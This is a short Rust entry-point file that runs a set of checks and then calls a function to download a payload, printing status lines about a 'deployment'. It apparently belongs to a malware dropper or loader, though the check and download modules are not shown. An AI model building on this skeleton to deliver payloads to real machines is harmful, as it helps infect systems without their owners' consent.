mod checks;
mod downloader;

use crate::checks::checks::{perfom_checks};
use crate::downloader::downloader::download_payload;

fn main() {

    if perfom_checks() {
        println!("[!] All Checks OK ✔️");
        if download_payload() {
            println!("[!] Payload Downloaded ✔️");
        } else {
            println!("[X] Failed to download payload ❌")
        }
    } else {
        println!("[X] Checks Failed aborting deployment ❌");
    }

}